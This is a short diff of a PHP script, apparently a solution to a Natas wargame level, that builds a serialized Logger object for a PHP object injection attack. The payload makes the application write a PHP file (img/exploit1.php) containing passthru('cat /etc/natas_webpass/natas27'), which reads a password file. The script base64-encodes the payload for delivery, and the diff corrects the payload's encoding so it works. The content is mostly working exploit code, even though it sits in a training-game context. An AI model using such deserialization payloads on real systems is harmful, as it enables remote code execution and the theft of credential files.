@@ -35,7 +35,7 @@
 // $data = new Logger("test");
 // echo serialize($data) . "\r\n";
 
-$serializedData = 'O:6:"Logger":3:{s:15:"LoggerlogFile";s:13:"img/hack.php";s:15:"LoggerinitMsg";s:22:"#--session started--# ";s:15:"LoggerexitMsg";s:53:"<?php passthru(\'cat /etc/natas_webpass/natas27\') ?>";}';
+$serializedData = "O:6:\"Logger\":3:{s:15:\"\0Logger\0logFile\";s:16:\"img/exploit1.php\";s:15:\"\0Logger\0initMsg\";s:22:\"#--session started--#\n\";s:15:\"\0Logger\0exitMsg\";s:57:\"<?php echo passthru('cat /etc/natas_webpass/natas27'); ?>\";}";
 echo base64_encode($serializedData);
 
 echo "\n";
